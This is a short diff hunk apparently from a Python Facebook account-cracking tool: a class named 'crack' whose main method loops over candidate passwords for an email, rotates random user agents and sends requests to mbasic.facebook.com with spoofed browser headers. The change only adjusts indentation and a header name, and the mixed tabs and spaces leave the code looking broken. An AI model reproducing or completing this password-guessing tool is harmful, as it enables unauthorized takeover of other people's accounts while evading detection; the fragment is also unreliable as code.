@@ -289,15 +289,12 @@ class crack:
     ### MAIN ###
     def main(self, total, email, password):
         try:
-		for pws in password:
-			ua = random.choice(ugen)
-			ua2 = random.choice(ugen2)
-		    
+	      for pws in password:
+		ua = random.choice(ugen)
 		#self.useragent = self.realme_useragent(total = 1)
-		
                     with requests.Session() as r:
 			r.headers.update({
-			    'Host': 'mbasic.facebook.com',
+			    'host': 'mbasic.facebook.com',
 			    'cache-control': 'max-age=0',
 			    'upgrade-insecure-requests': '1',
 			    'origin': 'https://mbasic.facebook.com',
